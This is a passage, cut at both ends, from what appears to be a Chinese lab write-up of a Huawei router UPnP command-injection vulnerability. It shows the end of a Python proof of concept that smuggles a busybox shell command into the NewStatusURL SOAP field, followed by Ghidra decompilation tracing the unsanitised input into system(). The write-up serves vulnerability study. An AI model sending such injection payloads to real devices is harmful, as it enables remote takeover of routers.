response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669"</span><span class="token punctuation">&#125;</span>data <span class="token operator">=</span> <span class="token triple-quoted-string string">'''&lt;?xml version="1.0" ?> &lt;s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">  &lt;s:Body>&lt;u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">   &lt;NewStatusURL>;/bin/busybox mkdir shell;&lt;/NewStatusURL>   &lt;NewDownloadURL>HUAWEIUPNP&lt;/NewDownloadURL>  &lt;/u:Upgrade> &lt;/s:Body>&lt;/s:Envelope>'''</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://192.168.146.137:37215/ctrlt/DeviceUpgrade_1'</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>post请求的IP地址写Qemu机的IP地址。执行后，结果如下：<br><img src="https://i.bmp.ovh/imgs/2022/01/ce55e82d38946b38.png" alt=""><br>成功rce。</p><h2 id="0x03-漏洞分析"><a class="header-anchor" href="#0x03-漏洞分析">¶</a>0x03 漏洞分析</h2><p>漏洞环境和服务都已搭建成功，并且已经成功验证。接下来结合固件分析更加深入理解该漏洞的成因。</p><h3 id="分析漏洞函数"><a class="header-anchor" href="#分析漏洞函数">¶</a>分析漏洞函数</h3><p>首先，使用Ghidra打开upnp文件。由poc不难发现，注入命令的位置出现在<code>&lt;NewStatusURL&gt;</code>节点以内。所以先尝试搜索该字符串。</p><p>在字符串搜索框搜索，<code>NewStatusURL</code>,的到如下函数。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">FUN_0040749c</span><span class="token punctuation">(</span><span class="token keyword">int</span> param_1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_418<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_414<span class="token punctuation">;</span>  <span class="token keyword">char</span> acStack1040 <span class="token punctuation">[</span><span class="token number">1028</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    iVar1 <span class="token operator">=</span> <span class="token function">ATP_XML_GetChildNodeByName</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x2c</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"NewDownloadURL"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_418<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>local_418 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>     <span class="token punctuation">(</span>iVar1 <span class="token operator">=</span> <span class="token function">ATP_XML_GetChildNodeByName</span>                        <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x2c</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"NewStatusURL"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_414<span class="token punctuation">)</span><span class="token punctuation">,</span> iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>local_414 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">snprintf</span><span class="token punctuation">(</span>acStack1040<span class="token punctuation">,</span><span class="token number">0x400</span><span class="token punctuation">,</span><span class="token string">"upg -g -U %s -t \'1 Firmware Upgrade Image\' -c upnp -r %s -d -b"</span><span class="token punctuation">,</span>               local_418<span class="token punctuation">,</span>local_414<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">system</span><span class="token punctuation">(</span>acStack1040<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> iVar1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>容易发现system函数的参数来源于<code>snprintf</code>，再看snprintf函数中，参数的拼接用的是字符串<code>%s</code>传入，没有做任何的过滤处理，由此可以判断，这是由<code>snprintf</code>参数过滤不严格引起的，命令拼接RCE.</p><p>尝试查看该函数的交叉引用，发现失败。<br><img src="https://i.bmp.ovh/imgs/2022/01/e3aa953461727c2d.png" alt=""><br>这说明该函数是被间接调用的，目前为止，笔者只能想到，该函数是由虚函数表调用（比较常见）</p><p>寻找该函数的调用到目前为止，无法前进，但是漏洞的成因找到了。</p><h3 id="漏洞触发流程"><a class="header-anchor" href="#漏洞触发流程">¶</a>漏洞触发流程</h3><p>刚才我们尝试从漏洞函数的调用去寻找漏洞的触发点，失败了，接下来，我们换一种方法，正向的去寻找漏洞的触发点。进入文件系统，尝试搜索，该字符串在哪里出现了。<code>grep -r &quot;NewStatusURL&quot;</code></p><p><img src="https://i.bmp.ovh/imgs/2022/01/d2e4c615c810c54f.png" alt=""><br>在upnp的文件夹下面发现了仅有<code>DevUpg.xml</code>中有该字符串。（说明只有该地方用到了该字符串）</p><p>老样子，在Ghidra中搜索<code>DevUpg.xml</code>字符串，找到一个服务注册函数。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">ATP_UPNP_RegDeviceAndService</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar2<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar3<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar4<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar5<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar6<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar7<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar8<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar9<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar10<span class="token punctuation">;</span>  undefined4 local_128<span class="token punctuation">;</span>  undefined4 local_124<span class="token punctuation">;</span>  undefined4 local_120<span class="token punctuation">;</span>  undefined4 local_11c<span class="token punctuation">;</span>  undefined4 local_118<span class="token punctuation">;</span>  undefined4 local_114<span class="token punctuation">;</span>  undefined4 local_110<span class="token punctuation">;</span>  undefined4 local_10c<span class="token punctuation">;</span>  undefined4 local_108<span class="token punctuation">;</span>  undefined4 local_104<span class="token punctuation">;</span>  undefined4 local_100<span class="token punctuation">;</span>  undefined4 local_fc<span class="token punctuation">;</span>  undefined4 local_f8<span class="token punctuation">;</span>  undefined4 local_f4<span class="token punctuation">;</span>  undefined4 local_f0 <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> local_e8<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_e4<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_e0<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_dc<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_d8<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_d4<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_d0<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_cc<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_c8<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_c4<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_c0<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_bc<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_b8<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_b4<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_b0<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_ac<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_a8<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_a4<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_a0<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_9c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_98<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_94<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_90<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_8c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_88<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_84<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_80<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_7c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_78<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_74<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_70<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_6c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_68<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_64<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_60<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_5c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_58<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_54<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_50<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_4c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_48<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_44<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_40<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_3c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_38<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_34<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_30<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_2c<span class="token punctuation">;</span>    local_128 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_124 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_120 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_11c <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_118 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_114 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_110 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_10c <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_108 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_104 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_100 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_fc <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_f8 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_f4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  iVar1 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegDevice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>g_stDevDesc<span class="token punctuation">.</span>_4_4_<span class="token punctuation">,</span><span class="token string">"InternetGatewayDevice:1"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_128<span class="token punctuation">)</span><span class="token punctuation">;</span>  iVar2 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_128<span class="token punctuation">,</span><span class="token string">"urn:www-huawei-com:service:DeviceUpgrade:1"</span><span class="token punctuation">,</span><span class="token string">"DevUpg.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>                              <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_124<span class="token punctuation">)</span><span class="token punctuation">;</span>  iVar3 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_128<span class="token punctuation">,</span><span class="token string">"Layer3Forwarding:1"</span><span class="token punctuation">,</span><span class="token string">"L3Fwd.xml"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_120<span class="token punctuation">)</span><span class="token punctuation">;</span>  iVar4 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_128<span class="token punctuation">,</span><span class="token string">"LANConfigSecurity:1"</span><span class="token punctuation">,</span><span class="token string">"LANSec.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_118<span class="token punctuation">)</span><span class="token punctuation">;</span>  iVar5 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_128<span class="token punctuation">,</span><span class="token string">"urn:www-huawei-com:service:DeviceConfig:1"</span><span class="token punctuation">,</span><span class="token string">"DevCfg.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span>                              <span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_11c<span class="token punctuation">)</span><span class="token punctuation">;</span>  iVar5 <span class="token operator">=</span> iVar2 <span class="token operator">+</span> iVar1 <span class="token operator">+</span> iVar3 <span class="token operator">+</span> iVar4 <span class="token operator">+</span> iVar5<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar5 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    iVar1 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegDevice</span><span class="token punctuation">(</span>local_128<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"WANDevice:1"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_110<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar2 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_110<span class="token punctuation">,</span><span class="token string">"WANCommonInterfaceConfig:1"</span><span class="token punctuation">,</span><span class="token string">"WanCommonIfc1.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>                                <span class="token operator">&amp;</span>local_10c<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar3 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_110<span class="token punctuation">,</span><span class="token string">"WANDSLInterfaceConfig:1"</span><span class="token punctuation">,</span><span class="token string">"WanDslIfCfg.xml"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>                                <span class="token operator">&amp;</span>local_114<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar4 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegDevice</span><span class="token punctuation">(</span>local_110<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"WANConnectionDevice:1"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_108<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar6 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_108<span class="token punctuation">,</span><span class="token string">"WANDSLLinkConfig:1"</span><span class="token punctuation">,</span><span class="token string">"WanDslLink.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>local_f0<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar7 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_108<span class="token punctuation">,</span><span class="token string">"WANIPConnection:1"</span><span class="token punctuation">,</span><span class="token string">"WanIpConn.xml"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_100<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar8 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_108<span class="token punctuation">,</span><span class="token string">"WANPPPConnection:1"</span><span class="token punctuation">,</span><span class="token string">"WanPppConn.xml"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_104<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar9 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegDevice</span><span class="token punctuation">(</span>local_128<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"LANDevice:1"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_fc<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar10 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_fc<span class="token punctuation">,</span><span class="token string">"LANHostConfigManagement:1"</span><span class="token punctuation">,</span><span class="token string">"LanHostCfgMgmt.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>                                 <span class="token operator">&amp;</span>local_f8<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar5 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_fc<span class="token punctuation">,</span><span class="token string">"WLANConfiguration:1"</span><span class="token punctuation">,</span><span class="token string">"WLANCfg.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_f4<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar5 <span class="token operator">=</span> iVar2 <span class="token operator">+</span> iVar1 <span class="token operator">+</span> iVar3 <span class="token operator">+</span> iVar4 <span class="token operator">+</span> iVar6 <span class="token operator">+</span> iVar7 <span class="token operator">+</span> iVar8 <span class="token operator">+</span> iVar9 <span class="token operator">+</span> iVar10 <span class="token operator">+</span> iVar5<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar5 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      local_e8 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_124<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      iVar1 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_124<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_2c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_30 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_34 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_38 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_3c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_40 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_44 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_48 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_4c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_50 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x34</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_54 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x35</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_58 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x36</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_5c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x37</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_60 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_64 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f4<span class="token punctuation">,</span><span class="token number">0x39</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_68 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_118<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_6c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_11c<span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_70 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_11c<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_74 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_11c<span class="token punctuation">,</span><span class="token number">0xb</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_78 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_11c<span class="token punctuation">,</span><span class="token number">0xc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_7c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0xd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_80 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0xe</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_84 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0xf</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_88 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_8c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_90 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_100<span class="token punctuation">,</span><span class="token number">0x16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_94 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_98 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_9c <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x14</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_a0 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x15</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_a4 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x17</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_a8 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_ac <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f8<span class="token punctuation">,</span><span class="token number">0x19</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_b0 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f8<span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_b4 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f8<span class="token punctuation">,</span><span class="token number">0x1b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_b8 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_f8<span class="token punctuation">,</span><span class="token number">0x1c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_bc <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_10c<span class="token punctuation">,</span><span class="token number">0x1d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_c0 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_10c<span class="token punctuation">,</span><span class="token number">0x1e</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      local_c4 <span class="token operator">=</span> <span class="token function">ATP_UPNP_RegAction</span><span class="token punctuation">(</span>local_104<span class="token punctuation">,</span><span class="token number">0x1f</span><span class="token punctuation">)</span><span class="token 